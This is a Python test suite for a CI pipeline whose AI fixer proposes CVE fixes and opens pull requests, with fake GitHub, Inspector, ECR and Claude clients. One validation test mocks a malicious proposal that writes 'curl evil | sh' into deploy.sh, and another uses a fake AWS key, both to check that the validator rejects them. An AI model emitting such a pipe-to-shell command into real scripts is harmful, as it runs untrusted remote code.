"""
Tests for the developer loop: GitHub client, Inspector adapter, ECR image
labels, the AI fixer (context, Claude request shape, validation) and the full
push -> build -> scan -> Fix with AI -> Push fix -> rebuild -> re-scan loop
through the real handlers (local/app.py ci_loop). No network.
"""

import base64
import json
import os
import sys
import time
from types import SimpleNamespace

import pytest

ROOT = os.path.join(os.path.dirname(__file__), "..")
sys.path.insert(0, os.path.join(ROOT, "lambda", "common"))
sys.path.insert(0, os.path.join(ROOT, "local"))

import ai_fixer  # noqa: E402
import ecr_meta  # noqa: E402
import github_client  # noqa: E402
import inspector_client  # noqa: E402
import wiz_client  # noqa: E402

BASE = "library/python"
BASE_IMAGES = {BASE: {"fixed_tag_available": "3.12-alpine"}}
FINDINGS = [
    {"cve": "CVE-2022-40897", "severity": "HIGH", "layerType": "base", "baseImage": BASE,
     "package": "setuptools", "installedVersion": "58.1.0", "fixedVersion": "65.5.1"},
    {"cve": "CVE-2023-50782", "severity": "HIGH", "layerType": "app", "package": "cryptography",
     "installedVersion": "41.0.4", "fixedVersion": "42.0.0"},
    {"cve": "CVE-2024-26130", "severity": "HIGH", "layerType": "app", "package": "cryptography",
     "installedVersion": "41.0.4", "fixedVersion": "42.0.4"},
]
FILES = {
    "Dockerfile": "FROM docker.io/library/python:3.9-alpine3.16\nCOPY . /app\n",
    "requirements.txt": "cryptography==41.0.4\nflask==3.0.0\n",
    "app/crypto.py": "from cryptography.fernet import Fernet\n",
    "app/other.py": "print('hi')\n",
    "node_modules/x/requirements.txt": "cryptography==1\n",
}


# ---------------------------------------------------------------- GitHub client
class FakeGitHubHTTP:
    def __init__(self):
        self.calls = []

    def __call__(self, method, url, headers, body, timeout=30):
        path = url.replace("https://api.github.com", "")
        data = json.loads(body) if body else None
        self.calls.append((method, path, data))
        assert headers["Authorization"] == "Bearer t0k"
        if method == "GET" and "/git/commits/" in path:
            return 200, json.dumps({"tree": {"sha": "tree0"}}).encode()
        if method == "GET" and "/git/trees/" in path:
            return 200, json.dumps({"tree": [{"path": "Dockerfile", "type": "blob", "size": 9},
                                             {"path": "src", "type": "tree"}]}).encode()
        if method == "GET" and "/contents/" in path:
            return 200, json.dumps({"content": base64.b64encode(b"FROM x\n").decode()}).encode()
        if method == "POST" and path.endswith("/git/blobs"):
            return 201, b'{"sha": "blob1"}'
        if method == "POST" and path.endswith("/git/trees"):
            return 201, b'{"sha": "tree1"}'
        if method == "POST" and path.endswith("/git/commits"):
            return 201, b'{"sha": "commit1"}'
        if method == "POST" and path.endswith("/git/refs"):
            return 201, b'{}'
        if method == "POST" and path.endswith("/pulls"):
            return 201, b'{"number": 7, "html_url": "https://github.com/o/r/pull/7"}'
        return 404, b'{"message": "Not Found"}'


def test_github_read_and_commit_to_new_branch_then_pr():
    http = FakeGitHubHTTP()
    gh = github_client.GitHubClient("t0k", transport=http)
    assert gh.list_files("o/r", "abc") == [{"path": "Dockerfile", "size": 9}]
    assert gh.read_file("o/r", "Dockerfile", "abc") == "FROM x\n"
    sha = gh.commit_to_new_branch("o/r", "abc", "fix/x-1", {"Dockerfile": "FROM y\n"}, "msg")
    assert sha == "commit1"
    posts = [(p, d) for m, p, d in http.calls if m == "POST"]
    assert posts[1] == ("/repos/o/r/git/trees",
                        {"base_tree": "tree0", "tree": [{"path": "Dockerfile", "mode": "100644",
                                                         "type": "blob", "sha": "blob1"}]})
    assert posts[2][1]["parents"] == ["abc"]                       # parent = image commit
    assert posts[3] == ("/repos/o/r/git/refs", {"ref": "refs/heads/fix/x-1", "sha": "commit1"})
    assert not any("/git/refs/heads/main" in p for _, p, _ in http.calls)  # base branch untouched
    assert gh.open_pull_request("o/r", "fix/x-1", "main", "t", "b") == \
        {"number": 7, "url": "https://github.com/o/r/pull/7"}


def test_github_errors_and_url_parsing():
    gh = github_client.GitHubClient("t0k", transport=FakeGitHubHTTP())
    with pytest.raises(github_client.GitHubError, match="404"):
        gh.branch_sha("o/r", "main")
    with pytest.raises(github_client.GitHubError):
        github_client.GitHubClient("")
    assert github_client.repo_from_source_url("https://github.com/o/r.git") == "o/r"
    assert github_client.repo_from_source_url("git@github.com:o/r") == "o/r"
    assert github_client.repo_from_source_url("https://gitlab.com/o/r") is None


# ---------------------------------------------------------------- Inspector
INSPECTOR = [
    {"severity": "HIGH", "exploitAvailable": "YES", "epss": {"score": 0.42},
     "exploitabilityDetails": {"lastKnownExploitAt": "2026-01-01T00:00:00Z"},
     "packageVulnerabilityDetails": {"vulnerabilityId": "CVE-2023-7104", "vulnerablePackages": [
         {"name": "sqlite-libs", "version": "3.40.1", "release": "r0", "fixedInVersion": "3.40.1-r1",
          "packageManager": "OS", "sourceLayerHash": "sha256:base"}]}},
    {"severity": "HIGH", "exploitAvailable": "NO",
     "packageVulnerabilityDetails": {"vulnerabilityId": "CVE-2022-40897", "vulnerablePackages": [
         {"name": "setuptools", "version": "58.1.0", "fixedInVersion": "65.5.1",
          "packageManager": "PYTHONPKG", "sourceLayerHash": "sha256:base"}]}},
    {"severity": "MEDIUM",
     "packageVulnerabilityDetails": {"vulnerabilityId": "CVE-2023-32681", "vulnerablePackages": [
         {"name": "requests", "version": "2.25.1", "fixedInVersion": "NotAvailable",
          "packageManager": "PYTHONPKG", "sourceLayerHash": "sha256:app"}]}},
]


def test_inspector_to_wizcli_layers_epss_kev():
    res = inspector_client.to_wizcli(INSPECTOR, base_layers=["sha256:base"],
                                     base_ref="docker.io/library/python:3.9-alpine3.16")
    fs = {f["cve"]: f for f in wiz_client.normalize_wizcli_result(res, "demo/vuln-api:abc", [BASE])}
    assert fs["CVE-2023-7104"]["layerType"] == "base" and fs["CVE-2023-7104"]["baseImage"] == BASE
    assert fs["CVE-2023-7104"]["installedVersion"] == "3.40.1-r0"
    assert fs["CVE-2023-7104"]["kev"] is True and fs["CVE-2023-7104"]["epss"] == pytest.approx(0.42)
    assert fs["CVE-2022-40897"]["layerType"] == "base"          # pip package inside the base layer
    assert fs["CVE-2023-32681"]["layerType"] == "app" and fs["CVE-2023-32681"]["fixedVersion"] is None


def test_inspector_list_findings_pages():
    class FakeInspector:
        def __init__(self):
            self.calls = []

        def list_findings(self, **kw):
            self.calls.append(kw)
            return ({"findings": INSPECTOR[:2], "nextToken": "n"} if "nextToken" not in kw
                    else {"findings": INSPECTOR[2:]})
    fake = FakeInspector()
    assert len(inspector_client.list_image_findings(fake, "demo/vuln-api", "sha256:d")) == 3
    crit = fake.calls[0]["filterCriteria"]
    assert crit["ecrImageHash"][0]["value"] == "sha256:d"
    assert crit["findingStatus"][0]["value"] == "ACTIVE"


# ---------------------------------------------------------------- ECR labels
def test_ecr_meta_reads_labels_and_base_layers():
    labels = {"org.opencontainers.image.revision": "abc123", "com.innova.git.branch": "main",
              "org.opencontainers.image.source": "https://github.com/o/r",
              "org.opencontainers.image.base.name": "python:3.9", "com.innova.base.layers": "2"}

    class FakeECR:
        def batch_get_image(self, **kw):
            return {"images": [{"imageManifest": json.dumps(
                {"config": {"digest": "sha256:cfg"},
                 "layers": [{"digest": d} for d in ("sha256:l1", "sha256:l2", "sha256:l3")]})}]}

        def get_download_url_for_layer(self, **kw):
            assert kw["layerDigest"] == "sha256:cfg"
            return {"downloadUrl": "https://s3/presigned"}
    meta = ecr_meta.describe_image(FakeECR(), "demo/vuln-api", "sha256:d",
                                   fetch=lambda u: json.dumps({"config": {"Labels": labels}}).encode())
    assert meta == {"commit": "abc123", "source": "https://github.com/o/r", "base_ref": "python:3.9",
                    "branch": "main", "base_layers": ["sha256:l1", "sha256:l2"]}


# ---------------------------------------------------------------- AI fixer
def listing():
    return [{"path": p, "size": len(c)} for p, c in FILES.items()]


def test_select_context_picks_build_files_and_users_of_vulnerable_packages():
    files, _ = ai_fixer.select_context(listing(), FILES.__getitem__, FINDINGS)
    assert set(files) == {"Dockerfile", "requirements.txt", "app/crypto.py"}


def test_select_context_limited_to_the_app_folder():
    mono = {"demo-app/Dockerfile": "FROM x\n", "demo-app/requirements.txt": "cryptography==41.0.4\n",
            "tests/test_x.py": "cryptography==41.0.4  # fixture\n", "requirements.txt": "aws-cdk-lib\n"}
    lst = [{"path": p, "size": len(c)} for p, c in mono.items()]
    files, _ = ai_fixer.select_context(lst, mono.__getitem__, FINDINGS, root="demo-app")
    assert set(files) == {"demo-app/Dockerfile", "demo-app/requirements.txt"}
    files, _ = ai_fixer.select_context(lst, mono.__getitem__, FINDINGS, root="./demo-app/")
    assert "tests/test_x.py" not in files


def test_validate_errors_and_warnings():
    files = {k: FILES[k] for k in ("Dockerfile", "requirements.txt")}
    good = {"changes": [{"path": "requirements.txt", "content": "cryptography==42.0.4\nflask==3.0.0\n"}]}
    v = ai_fixer.validate(good, files, FINDINGS, BASE_IMAGES)
    assert v["errors"] == []
    assert v["warnings"] == ["Dockerfile does not use library/python:3.12-alpine yet"]

    partial = {"changes": [{"path": "requirements.txt", "content": "cryptography==42.0.0\n"}]}
    assert any("still pinned at 42.0.0" in w for w in
               ai_fixer.validate(partial, files, FINDINGS, BASE_IMAGES)["warnings"])

    bad = {"changes": [{"path": ".github/workflows/x.yml", "content": "x"},
                       {"path": "requirements.txt", "content": "cryptography==42.0.4\n# " + "AKIA" + "ABCDEFGHIJKLMNOP\n"}]}  # fake key, split so secret scanners don't flag the repo
    errs = ai_fixer.validate(bad, files, FINDINGS, BASE_IMAGES)["errors"]
    assert any("not one of the files" in e for e in errs)
    assert any("looks like a secret" in e for e in errs)
    assert ai_fixer.validate({"changes": []}, files, FINDINGS, BASE_IMAGES)["errors"] == \
        ["the proposal changes nothing"]


def test_rule_based_proposal_and_diffs():
    files = {k: FILES[k] for k in ("Dockerfile", "requirements.txt")}
    p = ai_fixer.propose_rule_based("demo/vuln-api:abc", FINDINGS, BASE_IMAGES, files)
    new = {c["path"]: c["content"] for c in p["changes"]}
    assert new["Dockerfile"].startswith("FROM docker.io/library/python:3.12-alpine")
    assert "cryptography==42.0.4" in new["requirements.txt"]
    assert ai_fixer.validate(p, files, FINDINGS, BASE_IMAGES) == {"errors": [], "warnings": []}
    d = {x["path"]: x["diff"] for x in ai_fixer.diffs(files, p)}
    assert "-cryptography==41.0.4" in d["requirements.txt"] and "+cryptography==42.0.4" in d["requirements.txt"]


class FakeStream:
    def __init__(self, message, log):
        self.message, self.log = message, log

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def get_final_message(self):
        return self.message


class FakeClaude:
    def __init__(self, message):
        self.log = []
        self.messages = SimpleNamespace(stream=lambda **kw: (self.log.append(kw), FakeStream(message, self.log))[1])


def _message(blocks, stop="tool_use"):
    return SimpleNamespace(content=blocks, stop_reason=stop, stop_details=None,
                           usage=SimpleNamespace(input_tokens=1200, output_tokens=300))


def test_claude_request_shape_and_tool_result(monkeypatch):
    monkeypatch.setattr(ai_fixer, "MODEL_ID", "anthropic.claude-opus-5-5")
    fix = {"summary": "bump", "changes": [{"path": "requirements.txt", "content": "cryptography==42.0.4\n",
                                           "reason": "CVEs"}],
           "addressed": [{"cve": "CVE-2023-50782", "how": "bump"}], "not_addressed": [], "risks": []}
    client = FakeClaude(_message([SimpleNamespace(type="text", text="Here is the fix."),
                                  SimpleNamespace(type="tool_use", name="submit_fix", input=fix)]))
    p = ai_fixer.propose("demo/vuln-api:abc", FINDINGS, BASE_IMAGES, FILES, client=client)
    assert p["mode"] == "bedrock" and p["model"] == "anthropic.claude-opus-5-5"
    assert p["usage"] == {"input_tokens": 1200, "output_tokens": 300}
    req = client.log[0]
    assert req["model"] == "anthropic.claude-opus-5-5" and req["max_tokens"] == 64000
    assert req["tool_choice"] == {"type": "auto"}                 # forced tool_choice is rejected
    assert req["tools"][0]["name"] == "submit_fix"
    assert "format" not in req["output_config"]                   # no structured outputs on Bedrock
    assert "temperature" not in req and "thinking" not in req
    user = req["messages"][0]["content"]
    assert user.startswith("<DATA>") and '<file path="requirements.txt">' in user


@pytest.mark.parametrize("message,match", [
    (_message([], stop="refusal"), "declined"),
    (_message([], stop="max_tokens"), "too large"),
    (_message([SimpleNamespace(type="text", text="no tool")], stop="end_turn"), "without submitting"),
    (_message([SimpleNamespace(type="tool_use", name="submit_fix", input={"summary": "x"})]), "changes"),
])
def test_claude_failure_modes(monkeypatch, message, match):
    monkeypatch.setattr(ai_fixer, "MODEL_ID", "anthropic.claude-opus-5-5")
    with pytest.raises(ai_fixer.FixError, match=match):
        ai_fixer.propose("i:t", FINDINGS, BASE_IMAGES, FILES, client=FakeClaude(message))


def test_real_sdk_builds_a_valid_bedrock_request(monkeypatch):
    """The installed Anthropic SDK's Bedrock client accepts our request and parses a
    streamed submit_fix tool call (HTTP intercepted; no AWS call)."""
    anthropic = pytest.importorskip("anthropic")
    httpx2 = pytest.importorskip("httpx2")
    monkeypatch.setattr(ai_fixer, "MODEL_ID", "anthropic.claude-opus-5-5")
    fix = {"summary": "bump", "changes": [{"path": "requirements.txt",
                                           "content": "cryptography==42.0.4\n", "reason": "r"}],
           "addressed": [], "not_addressed": [], "risks": []}
    events = [
        ("message_start", {"type": "message_start", "message": {
            "id": "msg_1", "type": "message", "role": "assistant", "model": "anthropic.claude-opus-5-5",
            "content": [], "stop_reason": None, "stop_sequence": None,
            "usage": {"input_tokens": 10, "output_tokens": 1}}}),
        ("content_block_start", {"type": "content_block_start", "index": 0, "content_block": {
            "type": "tool_use", "id": "toolu_1", "name": "submit_fix", "input": {}}}),
        ("content_block_delta", {"type": "content_block_delta", "index": 0, "delta": {
            "type": "input_json_delta", "partial_json": json.dumps(fix)}}),
        ("content_block_stop", {"type": "content_block_stop", "index": 0}),
        ("message_delta", {"type": "message_delta", "delta": {"stop_reason": "tool_use",
                                                              "stop_sequence": None},
                           "usage": {"output_tokens": 50}}),
        ("message_stop", {"type": "message_stop"}),
    ]
    sse = "".join(f"event: {e}\ndata: {json.dumps(d)}\n\n" for e, d in events).encode()
    seen = {}

    def handler(request):
        seen["url"] = str(request.url)
        seen["body"] = json.loads(request.content)
        seen["auth"] = request.headers.get("authorization", "")
        return httpx2.Response(200, headers={"content-type": "text/event-stream"}, content=sse)

    client = anthropic.AnthropicBedrockMantle(
        aws_region="us-east-1", aws_access_key="AKIDEXAMPLE", aws_secret_key="secret",
        http_client=httpx2.Client(transport=httpx2.MockTransport(handler)))
    p = ai_fixer.propose("demo/vuln-api:abc", FINDINGS, BASE_IMAGES, FILES, client=client)
    assert p["changes"][0]["content"] == "cryptography==42.0.4\n"
    assert seen["url"].startswith("https://bedrock-mantle.us-east-1.api.aws/anthropic/v1/messages")
    assert "AWS4-HMAC-SHA256" in seen["auth"]                       # SigV4-signed
    body = seen["body"]
    assert body["model"] == "anthropic.claude-opus-5-5" and body["stream"] is True
    assert body["tool_choice"] == {"type": "auto"} and body["output_config"] == {"effort": "high"}


# ---------------------------------------------------------------- full loop (local)
@pytest.fixture
def loop(tmp_path, monkeypatch):
    from app import LocalApp
    a = LocalApp(step_delay=0, ci_loop=True)
    monkeypatch.setattr(a.store, "S3_DIR", str(tmp_path / "s3"))
    yield a
    os.environ["WIZ_MOCK"] = "true"
    os.environ["SCANNER"] = "mock"


def wait_fix(app, fix_id, done=lambda s: s["fix"]["status"] != "RUNNING"):
    for _ in range(400):
        s = app.call("GET /fix/{id}", {"id": fix_id})[1]
        if done(s):
            return s
        time.sleep(0.02)
    raise AssertionError(s)


def test_push_build_scan_fix_push_rescan(loop):
    seeded = loop.seed()
    assert seeded["source"] == "mock repo scanner" and seeded["ingested"] == 23
    img = seeded["image"]
    rec = loop.call("GET /images")[1]["images"][0]
    assert rec["branch"] == "main" and rec["github"] == "innova-demo/vuln-api" and rec["scan_status"] == "DONE"

    code, body = loop.call("POST /fix", body={"image": img}, claims={"email": "dev@innova"})
    assert code == 202
    fix_id = body["fix"]["id"]
    s = wait_fix(loop, fix_id)
    assert s["fix"]["status"] == "READY" and s["fix"]["mode"] == "rule-based"
    assert s["validation"]["errors"] == [] and {d["path"] for d in s["diffs"]} == {"Dockerfile", "requirements.txt"}
    assert loop.call("GET /image-findings", query={"image": img})[1]["source"]["last_fix_id"] == fix_id

    code, body = loop.call("POST /fix/{id}/push", {"id": fix_id})
    assert code == 200
    f = body["fix"]
    assert f["branch"] == f"fix/demo-vuln-api-{fix_id}" and f["pr"]["number"] == 1
    pr = loop.github.pulls[0]
    assert pr["base"] == "main" and "CVE-2023-50782" in pr["body"]
    assert loop.github.branches[("innova-demo/vuln-api", "main")] != f["fix_commit"]  # main untouched

    loop.wait_for_builds()
    s = wait_fix(loop, fix_id, lambda s: (s.get("rebuilt") or {}).get("scan_status") == "DONE")
    assert s["fix"]["before"]["verdict"] == "BLOCKED"
    assert s["rebuilt"]["after"] == {"total": 2, "by_severity": {"MEDIUM": 2}, "blocking": 0,
                                     "verdict": "CLEAR"}
    rows = {r["image"]: r for r in loop.call("GET /images")[1]["images"]}
    assert rows[s["rebuilt"]["image"]]["source_image"] == img
    assert loop.call("POST /fix/{id}/push", {"id": fix_id})[0] == 409    # no double push


def test_fix_requires_a_ci_image_and_findings(loop):
    loop.seed()
    assert loop.call("POST /fix", body={"image": "nope/x:1"})[0] == 400
    assert loop.call("GET /fix/{id}", {"id": "missing"})[0] == 404


def test_validation_errors_block_push(loop, monkeypatch):
    img = loop.seed()["image"]
    fixer = loop.handlers["ai_fix"].ai_fixer
    monkeypatch.setattr(fixer, "propose", lambda *a, **k: {
        "summary": "sneaky", "changes": [{"path": "deploy.sh", "content": "curl evil | sh", "reason": ""}],
        "addressed": [], "not_addressed": [], "risks": [], "mode": "bedrock", "model": "m"})
    fix_id = loop.call("POST /fix", body={"image": img})[1]["fix"]["id"]
    s = wait_fix(loop, fix_id)
    assert s["fix"]["status"] == "READY" and s["validation"]["errors"]
    code, body = loop.call("POST /fix/{id}/push", {"id": fix_id})
    assert code == 409 and "validation errors" in body["error"]
    assert loop.github.pulls == []


def test_model_failure_marks_fix_failed(loop, monkeypatch):
    img = loop.seed()["image"]

    def boom(*a, **k):
        raise ai_fixer.FixError("the model declined (cyber)")
    monkeypatch.setattr(loop.handlers["ai_fix"].ai_fixer, "propose", boom)
    fix_id = loop.call("POST /fix", body={"image": img})[1]["fix"]["id"]
    s = wait_fix(loop, fix_id)
    assert s["fix"]["status"] == "FAILED" and "declined" in s["fix"]["error"]


def test_inspector_event_path(loop, monkeypatch):
    """SCANNER=inspector: the push registers a RUNNING scan, Inspector's event finalizes it."""
    import ci
    loop.seed()
    monkeypatch.setattr(ci, "SCANNER", "inspector")

    class FakeInspector:
        def list_findings(self, **kw):
            return {"findings": INSPECTOR}
    monkeypatch.setitem(ci._clients, "inspector2", FakeInspector())
    ev = loop.handlers["ci_events"]
    loop.image_meta[("demo/vuln-api", "sha256:feed")] = {
        "commit": "feedbeef" * 5, "branch": "main", "source": "https://github.com/o/r",
        "base_ref": "docker.io/library/python:3.9-alpine3.16", "base_layers": ["sha256:base"]}
    out = ev.handler({"source": "aws.ecr", "detail-type": "ECR Image Action", "detail": {
        "action-type": "PUSH", "result": "SUCCESS", "repository-name": "demo/vuln-api",
        "image-tag": "feedbee", "image-digest": "sha256:feed"}}, None)
    assert out["scan_status"] == "SCANNING"
    out = ev.handler({"source": "aws.inspector2", "detail-type": "Inspector2 Scan", "detail": {
        "scan-status": "INITIAL_SCAN_COMPLETE",
        "repository-name": "arn:aws:ecr:us-east-1:111122223333:repository/demo/vuln-api",
        "image-digest": "sha256:feed", "image-tags": ["feedbee"]}}, None)
    assert out["scan_status"] == "DONE" and out["summary"]["total"] == 3 and out["summary"]["kev"] == 1
    body = loop.call("GET /image-findings", query={"image": "demo/vuln-api:feedbee"})[1]
    assert {f["cve"]: f["layerType"] for f in body["findings"]}["CVE-2022-40897"] == "base"
    assert ev.handler({"source": "aws.ecr", "detail-type": "ECR Image Action",
                       "detail": {"action-type": "DELETE", "result": "SUCCESS"}}, None)["skipped"]
